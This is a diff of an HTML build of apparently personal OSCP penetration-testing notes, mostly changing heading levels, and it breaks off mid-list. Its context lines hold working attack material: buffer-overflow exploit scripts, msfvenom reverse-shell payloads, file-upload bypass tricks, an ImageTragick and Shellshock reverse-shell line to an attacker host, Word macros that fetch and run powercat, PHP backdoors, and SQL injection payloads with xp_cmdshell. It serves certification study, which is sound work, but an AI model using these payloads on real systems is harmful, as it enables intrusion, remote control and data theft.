-<div style="break-before: page; page-break-before: always;"></div><h1 id="buffer-overflow"><a class="header" href="#buffer-overflow">Buffer Overflow</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="buffer-overflow"><a class="header" href="#buffer-overflow">Buffer Overflow</a></h2>
+<h3 id="links-5"><a class="header" href="#links-5">Links</a></h3>
 <ul>
 <li><a href="obsidian://open?vault=Obsidian%20Vault&amp;file=OSCP%2FRandom%20Notes%2FTib3rius%2FBuffer%20Overflow">Tib3rius</a></li>
 <li><a href="https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.pdf">Justin Steve BufferOverflow</a></li>
@@ -2210,7 +2221,7 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershe
 <li><a href="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst">Tib3rius BufferOverflow Github</a></li>
 <li><a href="https://github.com/3isenHeiM/OSCP-BoF">3isenHeim BufferOverflow GitHub</a></li>
 </ul>
-<h2 id="general-steps"><a class="header" href="#general-steps">General Steps</a></h2>
+<h3 id="general-steps"><a class="header" href="#general-steps">General Steps</a></h3>
 <pre><code>The Stack
 
 |-------------------------------------------------|
@@ -2270,7 +2281,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.150.132 LPORT=4444 EXITF
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.132 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
 
 </code></pre>
-<h2 id="buffer-skeleton-program"><a class="header" href="#buffer-skeleton-program">Buffer Skeleton Program</a></h2>
+<h3 id="buffer-skeleton-program"><a class="header" href="#buffer-skeleton-program">Buffer Skeleton Program</a></h3>
 <pre><code>Buffer Over flow using Tib3rius Notes
 
 # Buffer Skeleton Script:
@@ -2313,7 +2324,7 @@ except:
 
 
 </code></pre>
-<h2 id="parameters-file"><a class="header" href="#parameters-file">Parameters File</a></h2>
+<h3 id="parameters-file"><a class="header" href="#parameters-file">Parameters File</a></h3>
 <pre><code># PARAMETERS.py
 # This is the files with all the variables
 # This has been designed for the OSCP buffer overflow machine
@@ -2345,7 +2356,7 @@ sub_esp_10 = b"\x83\xec\x10"
 
 
 </code></pre>
-<h2 id="create-bad-chars-file"><a class="header" href="#create-bad-chars-file">Create Bad Chars File</a></h2>
+<h3 id="create-bad-chars-file"><a class="header" href="#create-bad-chars-file">Create Bad Chars File</a></h3>
 <pre><code>#!/usr/bin/env python
 from __future__ import print_function
 
@@ -2355,7 +2366,7 @@ for x in range(1, 256):
 print()
 
 </code></pre>
-<h2 id="quasi-auto-fuzzer"><a class="header" href="#quasi-auto-fuzzer">Quasi Auto Fuzzer</a></h2>
+<h3 id="quasi-auto-fuzzer"><a class="header" href="#quasi-auto-fuzzer">Quasi Auto Fuzzer</a></h3>
 <pre><code>
 # Fuzzer.py
 
@@ -2382,7 +2393,7 @@ while True:
 
 
 </code></pre>
-<h2 id="tryhackme-fuzzer"><a class="header" href="#tryhackme-fuzzer">TryHackMe Fuzzer</a></h2>
+<h3 id="tryhackme-fuzzer"><a class="header" href="#tryhackme-fuzzer">TryHackMe Fuzzer</a></h3>
 <pre><code>#!/usr/bin/env python3
 
 import socket, time, sys
@@ -2412,7 +2423,7 @@ while True:
 
 
 </code></pre>
-<h2 id="tryhackme-exploit-code"><a class="header" href="#tryhackme-exploit-code">TryHackMe Exploit Code</a></h2>
+<h3 id="tryhackme-exploit-code"><a class="header" href="#tryhackme-exploit-code">TryHackMe Exploit Code</a></h3>
 <pre><code>import socket
 
 ip = "10.10.84.48"
@@ -2440,7 +2451,7 @@ except:
 
 
 </code></pre>
-<h2 id="1-trigger-bug"><a class="header" href="#1-trigger-bug">1 Trigger Bug</a></h2>
+<h3 id="1-trigger-bug"><a class="header" href="#1-trigger-bug">1 Trigger Bug</a></h3>
 <pre><code>
  #!/usr/bin/env python2
 import socket
@@ -2457,7 +2468,7 @@ s.send(buf)
 
 
 </code></pre>
-<h2 id="2-find-offset"><a class="header" href="#2-find-offset">2 Find Offset</a></h2>
+<h3 id="2-find-offset"><a class="header" href="#2-find-offset">2 Find Offset</a></h3>
 <pre><code>#!/usr/bin/env python2
 
 #msf-pattern_create -l 1024
@@ -2480,7 +2491,7 @@ s.send('TRUN /.:/'+buf)
 
 
 </code></pre>
-<h2 id="3-confirm-offset"><a class="header" href="#3-confirm-offset">3 Confirm Offset</a></h2>
+<h3 id="3-confirm-offset"><a class="header" href="#3-confirm-offset">3 Confirm Offset</a></h3>
 <pre><code>#!/usr/bin/env python2
 import socket
 
@@ -2503,7 +2514,7 @@ s.send('TRUN /.:/'+buf)
 
 
 </code></pre>
-<h2 id="4-find-bad-chars"><a class="header" href="#4-find-bad-chars">4 Find Bad Chars</a></h2>
+<h3 id="4-find-bad-chars"><a class="header" href="#4-find-bad-chars">4 Find Bad Chars</a></h3>
 <pre><code>
 #!/usr/bin/env python2
 
@@ -2542,7 +2553,7 @@ s.send('TRUN /.:/'+buf)
 
 
 </code></pre>
-<h2 id="5-the-jmp"><a class="header" href="#5-the-jmp">5 The JMP</a></h2>
+<h3 id="5-the-jmp"><a class="header" href="#5-the-jmp">5 The JMP</a></h3>
 <pre><code>
 #!/usr/bin/env python2
 import socket
@@ -2571,7 +2582,7 @@ s.send('TRUN /.:/'+buf)
 
 
 </code></pre>
-<h2 id="6-pop-calc"><a class="header" href="#6-pop-calc">6 Pop Calc</a></h2>
+<h3 id="6-pop-calc"><a class="header" href="#6-pop-calc">6 Pop Calc</a></h3>
 <pre><code>#!/usr/bin/env python2
 import socket
 import struct
@@ -2629,7 +2640,7 @@ s.send(buf)
 
 
 </code></pre>
-<h2 id="7-pop-shell"><a class="header" href="#7-pop-shell">7 Pop Shell</a></h2>
+<h3 id="7-pop-shell"><a class="header" href="#7-pop-shell">7 Pop Shell</a></h3>
 <pre><code>
 #!/usr/bin/env python2
 import socket
@@ -2691,17 +2702,19 @@ s.send('TRUN /.:/'+buf)
 
 
 </code></pre>
-<h2 id="smash-the-stack-notes"><a class="header" href="#smash-the-stack-notes">Smash The Stack Notes</a></h2>
+<h3 id="smash-the-stack-notes"><a class="header" href="#smash-the-stack-notes">Smash The Stack Notes</a></h3>
 <pre><code>
 void function(int a, int b, int c) {   char buffer1[5];   char buffer2[10];   int *ret;   ret = buffer1 + 12;   (*ret) += 8; } void main() {  int x;  x = 0;  function(1,2,3);  x = 1;  printf("%d\n",x); }
 
 
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><p>Only refer Extensions section below for OSCP File upload Bypassing</p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="file-uploads"><a class="header" href="#file-uploads">File Uploads</a></h2>
+<p>Only refer Extensions section below for OSCP File upload Bypassing</p>
+<h3 id="links-6"><a class="header" href="#links-6">Links</a></h3>
 <ul>
 <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html">Total OSCP Guide File Uploads</a></li>
 </ul>
-<h2 id="extensions"><a class="header" href="#extensions">EXTENSIONS</a></h2>
+<h3 id="extensions"><a class="header" href="#extensions">EXTENSIONS</a></h3>
 <ul>
 <li><strong>PHP</strong>: <em>.php</em>, <em>.php2</em>, <em>.php3</em>, .<em>php4</em>, .<em>php5</em>, .<em>php6</em>, .<em>php7</em>, .phps, .<em>phps</em>, .<em>pht</em>, .<em>phtm, .phtml</em>, .<em>pgif</em>, <em>.shtml, .htaccess, .phar, .inc</em></li>
 <li><strong>ASP</strong>: <em>.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml</em></li>
@@ -2711,7 +2724,7 @@ void function(int a, int b, int c) {   char buffer1[5];   char buffer2[10];   in
 <li><strong>Perl</strong>: <em>.pl, .cgi</em></li>
 <li><strong>Erlang Yaws Web Server</strong>: <em>.yaws</em></li>
 </ul>
-<h2 id="bypass-file-extensions-checks"><a class="header" href="#bypass-file-extensions-checks">Bypass file extensions checks</a></h2>
+<h3 id="bypass-file-extensions-checks"><a class="header" href="#bypass-file-extensions-checks">Bypass file extensions checks</a></h3>
 <ol>
 <li>
 <p>If they apply, then check the previous extensions. Also test them using some uppercase letters: PHP, .pHP5, .PhAr ...</p>
@@ -2766,7 +2779,7 @@ void function(int a, int b, int c) {   char buffer1[5];   char buffer2[10];   in
 <p>Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “::$data” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”)</p>
 </li>
 </ol>
-<h2 id="bypass-content-type--magic-number"><a class="header" href="#bypass-content-type--magic-number">Bypass Content-Type &amp; magic number</a></h2>
+<h3 id="bypass-content-type--magic-number"><a class="header" href="#bypass-content-type--magic-number">Bypass Content-Type &amp; magic number</a></h3>
 <ol>
 <li>
 <p>Bypass Content-Type checks by setting the value of the Content-Type header to image/png, text/plain, application/octet-stream</p>
@@ -2780,7 +2793,7 @@ void function(int a, int b, int c) {   char buffer1[5];   char buffer2[10];   in
 <ul>
 <li>It is also possible that the <strong>magic bytes</strong> are just being <strong>checked</strong> in the file and you could set them <strong>anywhere in the file</strong>.</li>
 </ul>
-<h2 id="other-tricks-to-check"><a class="header" href="#other-tricks-to-check">Other Tricks to check</a></h2>
+<h3 id="other-tricks-to-check"><a class="header" href="#other-tricks-to-check">Other Tricks to check</a></h3>
 <ul>
 <li>
 <p>Find a vulnerability to rename the file already uploaded (to change the extension).</p>
@@ -2803,7 +2816,7 @@ void function(int a, int b, int c) {   char buffer1[5];   char buffer2[10];   in
 <p>Try also to upload an executable (.exe) or a .html (less suspicious) that will execute code when accidentally opened by the victim.</p>
 </li>
 </ul>
-<h2 id="wget-file-uploadssrf-trick"><a class="header" href="#wget-file-uploadssrf-trick">wget File Upload/SSRF Trick</a></h2>
+<h3 id="wget-file-uploadssrf-trick"><a class="header" href="#wget-file-uploadssrf-trick">wget File Upload/SSRF Trick</a></h3>
 <p>On some occasions, you may find that a server is using <strong><code>wget</code></strong> to <strong>download files</strong> and you can <strong>indicate</strong> the <strong>URL</strong>. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, <strong>this check can be bypassed.</strong> The <strong>maximum</strong> length of a <strong>filename</strong> in L<strong>inux</strong> is <strong>255</strong>, however, <strong>wget</strong> truncate the filenames to <strong>236</strong> characters. You can <strong>download a file called "A"*232+".php"+".gif"</strong>, this filename will <strong>bypass</strong> the <strong>check</strong> (as in this example <strong>".gif"</strong> is a <strong>valid</strong> extension) but <code>wget</code> will <strong>rename</strong> the file to <strong>"A"*232+".php"</strong>.</p>
 <pre><code>#Create file and HTTP server
 echo "SOMETHING" &gt; $(python -c 'print("A"*(236-4)+".php"+".gif")')
@@ -2825,7 +2838,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[=============================================
 2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
 </code></pre>
 <p>Note that <strong>another option</strong> you may be thinking of to bypass this check is to make the <strong>HTTP server redirect to a different file</strong>, so the initial URL will bypass the check by then Wget will download the redirected file with the new name. This <strong>won't work</strong> <strong>unless</strong> the wget is being used with the <strong>parameter</strong> <code>--trust-server-names</code> because the <strong>wget will download the redirected page with the name of the file indicated in the original URL</strong>.</p>
-<h2 id="from-file-upload-to-other-vulnerabilities"><a class="header" href="#from-file-upload-to-other-vulnerabilities">From File upload to other vulnerabilities</a></h2>
+<h3 id="from-file-upload-to-other-vulnerabilities"><a class="header" href="#from-file-upload-to-other-vulnerabilities">From File upload to other vulnerabilities</a></h3>
 <ul>
 <li>Set <strong>filename</strong> to <code>../../../tmp/lol.png</code> and try to achieve a <strong>path traversal</strong></li>
 <li>Set <strong>filename</strong> to <code>sleep(10)-- -.jpg</code> and you may be able to achieve a <strong>SQL injection</strong></li>
@@ -2845,19 +2858,19 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[=============================================
 <li><strong>ZIP</strong>: RCE via LFI / DoS</li>
 <li><strong>PDF / PPTX</strong>: SSRF / BLIND XXE</li>
 </ol>
-<h2 id="magic-header-bytes"><a class="header" href="#magic-header-bytes">Magic Header Bytes</a></h2>
+<h3 id="magic-header-bytes"><a class="header" href="#magic-header-bytes">Magic Header Bytes</a></h3>
 <ul>
 <li><strong>PNG</strong>: <code>"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["</code></li>
 <li><strong>JPG</strong>: <code>"\xff\xd8\xff"</code></li>
 </ul>
-<h2 id="zip-file-automatically-decompressed-upload"><a class="header" href="#zip-file-automatically-decompressed-upload">Zip File Automatically decompressed Upload</a></h2>
+<h3 id="zip-file-automatically-decompressed-upload"><a class="header" href="#zip-file-automatically-decompressed-upload">Zip File Automatically decompressed Upload</a></h3>
 <p>If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:</p>
-<h3 id="symlink"><a class="header" href="#symlink">Symlink</a></h3>
+<h4 id="symlink"><a class="header" href="#symlink">Symlink</a></h4>
 <p>Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:</p>
 <pre><code>ln -s ../../../index.php symindex.txt
 zip --symlinks test.zip symindex.txt
 </code></pre>
-<h3 id="decompress-in-different-folders"><a class="header" href="#decompress-in-different-folders">Decompress in different folders</a></h3>
+<h4 id="decompress-in-different-folders"><a class="header" href="#decompress-in-different-folders">Decompress in different folders</a></h4>
 <p>The decompressed files will be created in unexpected folders.</p>
 <p>One could easily assume that this setup protects from OS-level command execution via malicious file uploads but unfortunately, this is not true. Since the ZIP archive format supports hierarchical compression and we can also reference higher-level directories we can escape from the safe upload directory by abusing the decompression feature of the target application.</p>
 <p>An automated exploit to create this kind of files can be found here: <a href="https://github.com/ptoomey3/evilarc">https://github.com/ptoomey3/evilarc</a></p>
@@ -2922,22 +2935,22 @@ root@s2crew:/tmp#
 Only one step remained: Upload the ZIP file and let the application decompress it! If it succeeds and the web server has sufficient privileges to write the directories there will be a simple OS command execution shell on the system:</p>
 <pre><code>url/cmd.php?cmd=id
 </code></pre>
-<h2 id="imagetragic"><a class="header" href="#imagetragic">ImageTragic</a></h2>
+<h3 id="imagetragic"><a class="header" href="#imagetragic">ImageTragic</a></h3>
 <p>Upload this content with an image extension to exploit the vulnerability <strong>(ImageMagick, 7.0.1-1)</strong></p>
 <pre><code>push graphic-context
 viewbox 0 0 640 480
 fill 'url(https://127.0.0.1/test.jpg"|bash -i &gt;&amp; /dev/tcp/attacker-ip/attacker-port 0&gt;&amp;1|touch "hello)'
 pop graphic-context
 </code></pre>
-<h2 id="embedding-php-shell-on-png"><a class="header" href="#embedding-php-shell-on-png">Embedding PHP Shell on PNG</a></h2>
+<h3 id="embedding-php-shell-on-png"><a class="header" href="#embedding-php-shell-on-png">Embedding PHP Shell on PNG</a></h3>
 <p>The primary reason for putting a web shell in the IDAT chunk is that it has the ability to bypass resize and re-sampling operations - PHP-GD contains two functions to do this <a href="http://php.net/manual/en/function.imagecopyresized.php">imagecopyresized</a> and <a href="http://php.net/manual/en/function.imagecopyresampled.php">imagecopyresampled</a>.</p>
 <p>Read this post: <a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p>
-<h2 id="polyglot-files"><a class="header" href="#polyglot-files">Polyglot Files</a></h2>
+<h3 id="polyglot-files"><a class="header" href="#polyglot-files">Polyglot Files</a></h3>
 <p>Polyglots, in a security context, are files that are a valid form of multiple different file types. For example, a <a href="https://en.wikipedia.org/wiki/Gifar">GIFAR</a> is both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.</p>
 <p>Polyglot files are often used to bypass protection based on file types. Many applications that allow users to upload files only allow uploads of certain types, such as JPEG, GIF, DOC, so as to prevent users from uploading potentially dangerous files like JS files, PHP files or Phar files.</p>
 <p>This helps to upload a file that complies with the format of several different formats. It can allow you to upload a PHAR file (PHP ARchive) that also looks like a JPEG, but probably you will still need a valid extension and if the upload function doesn't allow it this won't help you.</p>
 <p>More information in: <a href="https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a">https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a</a></p>
-<h2 id="php-powershell-upload-example"><a class="header" href="#php-powershell-upload-example">PHP PowerShell Upload Example</a></h2>
+<h3 id="php-powershell-upload-example"><a class="header" href="#php-powershell-upload-example">PHP PowerShell Upload Example</a></h3>
 <pre><code>Upload the backdoor, then:
 
 curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
@@ -2961,12 +2974,14 @@ ssh -p 2222 -i fileup root@mountaindesserts.com
 
 
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><p>If a file is created with the extension of <em><strong>.hta</strong></em> instead of <em><strong>.html</strong></em>, Internet Explorer will automatically interpret it as an HTML Application and offer the ability to execute it using the mshta.exe program. This attack only works for Internet Explorer.</p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="html-file-upload"><a class="header" href="#html-file-upload">HTML File Upload</a></h2>
+<p>If a file is created with the extension of <em><strong>.hta</strong></em> instead of <em><strong>.html</strong></em>, Internet Explorer will automatically interpret it as an HTML Application and offer the ability to execute it using the mshta.exe program. This attack only works for Internet Explorer.</p>
 <pre><code># Crafting a payload and listener
 msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f hta-psh -o evil.hta
 nc -lnvp 4444
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="manual-method"><a class="header" href="#manual-method">Manual Method</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="macros"><a class="header" href="#macros">Macros</a></h2>
+<h3 id="manual-method"><a class="header" href="#manual-method">Manual Method</a></h3>
 <pre><code>Open Word Document → View → Macros → Macro Name: MyMacro → Macros in: Document(1) → Create
 Save it in only .docm or .doc format .docx is not supported.
 
@@ -3000,7 +3015,7 @@ for i in range(0, len(str), n):
 
 3) Copy the split and paste it in Macro (below Dim str and above CreateObject)
 </code></pre>
-<h2 id="metasploit-1"><a class="header" href="#metasploit-1">Metasploit</a></h2>
+<h3 id="metasploit-1"><a class="header" href="#metasploit-1">Metasploit</a></h3>
 <ol>
 <li>
 <p>Follow the First 4 Steps with the below's reference: <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/office_word_macro.md">https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/office_word_macro.md</a></p>
@@ -3018,7 +3033,7 @@ set payload windows/shell_reverse_tcp
 set lhost and lport
 Open a listener and pop up a reverse shell.
 </code></pre>
-<h2 id="macro-example"><a class="header" href="#macro-example">Macro Example</a></h2>
+<h3 id="macro-example"><a class="header" href="#macro-example">Macro Example</a></h3>
 <pre><code>If possible do a powershell reverse shell base 64 encoded:
 
 IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
@@ -3048,6 +3063,7 @@ Sub MyMacro()
 End Sub
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h2 id="ole"><a class="header" href="#ole">OLE</a></h2>
+<h3 id="ole-1"><a class="header" href="#ole-1">OLE</a></h3>
 <p>Object Linking and Embedding - Embed a Windows Batch file in a Microsoft Word Document.</p>
 <pre><code># Cat evil.hta and Copy the Powershell string only base 64 encoded strings.
 1) msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f hta-psh -o evil.hta
@@ -3069,14 +3085,15 @@ nc -nlvp &lt;PORT&gt;
 # Use Microsoft Publisher Instead of Microsoft Word document to bypass it.
 # Downside is, it's not installed on most systems.
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="lfi--rfi"><a class="header" href="#lfi--rfi">LFI / RFI</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="lfi--rfi"><a class="header" href="#lfi--rfi">LFI / RFI</a></h2>
 <p>ON OSCP, if you are able to find LFI anywhere, hunt down the SSH keys first</p>
+<h3 id="links-7"><a class="header" href="#links-7">Links</a></h3>
 <ul>
 <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html">Total OSCP Guide</a></li>
 <li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/">Payloads All The Things</a></li>
 <li><a href="https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601">LFI Medium Article</a></li>
 </ul>
-<h2 id="local-file-inclusion"><a class="header" href="#local-file-inclusion">Local File Inclusion:</a></h2>
+<h3 id="local-file-inclusion"><a class="header" href="#local-file-inclusion">Local File Inclusion:</a></h3>
 <ol>
 <li>Check if you can convert LFI to RFI</li>
 <li>Try adding %00 to bypass the added extension on the server side. (Works on PHP &lt; 5.3)</li>
@@ -3168,7 +3185,7 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64
 
 </code></pre>
 <p><img src="FileInclusionExample.png" alt="File Inclusion Example" /></p>
-<h1 id="remote-file-inclusion"><a class="header" href="#remote-file-inclusion">Remote File Inclusion</a></h1>
+<h2 id="remote-file-inclusion"><a class="header" href="#remote-file-inclusion">Remote File Inclusion</a></h2>
 <pre><code>//Simple PHP backdoor
 &lt;?php 
 if(isset($_REQUEST['cmd'])){ 
@@ -3205,31 +3222,36 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="detect"><a class="header" href="#detect">Detect</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="shell-shock"><a class="header" href="#shell-shock">Shell Shock</a></h2>
+<h3 id="detect"><a class="header" href="#detect">Detect</a></h3>
 <pre><code>nikto -h http://&lt;IP&gt;/
 OR
 nmap &lt;IP&gt; -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
 </code></pre>
-<h2 id="attack"><a class="header" href="#attack">Attack</a></h2>
+<h3 id="attack"><a class="header" href="#attack">Attack</a></h3>
 <pre><code>wget -qO- -U "() { test;};echo "Content-type: text/plain"; echo; echo; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.235",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 2&gt;&amp;1" http://&lt;IP&gt;/cgi-bin/admin.cgi
 OR
 curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;  bash -i &gt;&amp; /dev/tcp/&lt;Attacker IP&gt;/4444 0&gt;&amp;1; echo zzzz;'" http://&lt;Victim-IP&gt;/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="github"><a class="header" href="#github">Github</a></h1>
-<p>GIT Commit Dump - whenever you see some github files on the Victim machine, Exfiltrate it and refer to the following resources</p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="github"><a class="header" href="#github">Github</a></h2>
+<h3 id="links-8"><a class="header" href="#links-8">Links</a></h3>
 <ul>
 <li><a href="https://github.com/arthaud/git-dumper">Github Dump Tool</a></li>
 <li><a href="https://www.howtogeek.com/devops/how-to-view-commit-history-with-git-log/">Github Commit History</a></li>
 </ul>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="links-2"><a class="header" href="#links-2">Links</a></h2>
+<p>GIT Commit Dump - whenever you see some github files on the Victim machine, Exfiltrate it and refer to the following resources</p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="sql"><a class="header" href="#sql">SQL</a></h2>
+<h3 id="links-9"><a class="header" href="#links-9">Links</a></h3>
 <ul>
 <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md">Payload All The Things</a></li>
 <li><a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">MSSQL Cheat Sheet</a></li>
+<li><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/">SQL Injection Cheat Sheet</a></li>
+<li><a href="https://bhavsec.com/posts/mssql-rce/">From MSSQL to RCE</a></li>
 </ul>
-<h1 id="sqli"><a class="header" href="#sqli">SQLi</a></h1>
+<h3 id="sqli"><a class="header" href="#sqli">SQLi</a></h3>
 <p>Only Resources you will need to get Remote code using SQLi</p>
-<h2 id="mysql"><a class="header" href="#mysql">MYSQL</a></h2>
-<h3 id="authenticated-sqli"><a class="header" href="#authenticated-sqli">Authenticated SQLi</a></h3>
+<h3 id="mysql"><a class="header" href="#mysql">MYSQL</a></h3>
+<h4 id="authenticated-sqli"><a class="header" href="#authenticated-sqli">Authenticated SQLi</a></h4>
 <pre><code>SELECT version();
 SELECT system_user();
 show databases;
@@ -3243,14 +3265,14 @@ describe users; # describes columns in users' table
 SELECT * from &lt;test&gt;.&lt;users&gt;; # here test is DB and the user is a table in test db
 SELECT user, authentication_string FROM mysql.user WHERE user = 'test';bash
 </code></pre>
-<h3 id="error-based-sqli"><a class="header" href="#error-based-sqli">Error based SQLi</a></h3>
+<h4 id="error-based-sqli"><a class="header" href="#error-based-sqli">Error based SQLi</a></h4>
 <pre><code>tom' OR 1=1 -- //
 ' or 1=1 in (select @@version) -- //
 ' OR 1=1 in (SELECT * FROM users) -- //
 ' or 1=1 in (SELECT password FROM users) -- //
 ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- // # password for admin user
 </code></pre>
-<h3 id="union-based-sqli"><a class="header" href="#union-based-sqli">Union-based SQLi</a></h3>
+<h4 id="union-based-sqli"><a class="header" href="#union-based-sqli">Union-based SQLi</a></h4>
 <pre><code>*** injected UNION query has to include the same number of columns in the original query
 *** Data types need to be compatible between each column
 
@@ -3273,8 +3295,8 @@ SELECT user, authentication_string FROM mysql.user WHERE user = 'test';bash
 4) Enumrating few columns from the user table found above
 ' UNION SELECT null, username, password, description, null FROM users -- //
 </code></pre>
-<h2 id="mssql"><a class="header" href="#mssql"># MSSQL</a></h2>
-<h3 id="authenticated-sqli-1"><a class="header" href="#authenticated-sqli-1">Authenticated SQLi</a></h3>
+<h3 id="mssql"><a class="header" href="#mssql">MSSQL</a></h3>
+<h4 id="authenticated-sqli-1"><a class="header" href="#authenticated-sqli-1">Authenticated SQLi</a></h4>
 <pre><code>SELECT @@version;
 SELECT name FROM sys.databases; # master, tempdb, model and msdb are default
 SELECT * FROM offsec.information_schema.tables; # Returns table for offsec db
@@ -3287,7 +3309,7 @@ SELECT * from testuser.dbo.users; # We select dbo table schema between the db an
 admin lab # user # pass
 guest guest  # user # pass
 </code></pre>
-<h3 id="extra-notes-i-had"><a class="header" href="#extra-notes-i-had">Extra Notes I had</a></h3>
+<h4 id="extra-notes-i-had"><a class="header" href="#extra-notes-i-had">Extra Notes I had</a></h4>
 <pre><code>#### Line Comments
 
 **Comments out rest of the query.**   
@@ -3373,14 +3395,14 @@ EXECUTE xp_cmdshell 'whoami';
 &lt;? system($_REQUEST['cmd']); ?&gt;
 
 </code></pre>
-<h3 id="error-based-sql-injection"><a class="header" href="#error-based-sql-injection">Error-Based SQL Injection</a></h3>
+<h4 id="error-based-sql-injection"><a class="header" href="#error-based-sql-injection">Error-Based SQL Injection</a></h4>
 <ul>
 <li><strong>Goal</strong>: To generate an error message from the SQL database.</li>
 <li><strong>Method</strong>: Include SQL control characters or SQL code into a query.</li>
 <li><strong>Example</strong>: Inputting <code>' OR 1=1 --</code> in a user input field. If the backend query is <code>SELECT * FROM users WHERE username = '[input]'</code>, it becomes <code>SELECT * FROM users WHERE username = '' OR 1=1 --'</code>.</li>
 <li><strong>Result</strong>: The database returns an error or unexpected data, indicating vulnerability.</li>
 </ul>
-<h3 id="union-based-sql-injection"><a class="header" href="#union-based-sql-injection">Union-Based SQL Injection</a></h3>
+<h4 id="union-based-sql-injection"><a class="header" href="#union-based-sql-injection">Union-Based SQL Injection</a></h4>
 <ul>
 <li><strong>Goal</strong>: Retrieve data from other tables.</li>
 <li><strong>Method</strong>: Utilize the <code>UNION</code> SQL operator to combine results from multiple SELECT queries.</li>
@@ -3391,19 +3413,20 @@ EXECUTE xp_cmdshell 'whoami';
 </li>
 <li><strong>Consideration</strong>: Columns data types and number must match between the original and UNION query.</li>
 </ul>
-<h3 id="blind-sql-injection"><a class="header" href="#blind-sql-injection">Blind SQL Injection</a></h3>
+<h4 id="blind-sql-injection"><a class="header" href="#blind-sql-injection">Blind SQL Injection</a></h4>
 <ul>
 <li><strong>Goal</strong>: Retrieve data when no error message or data is directly returned.</li>
 <li><strong>Method</strong>: Ask the database a true/false question and determine the answer based on the application's response.</li>
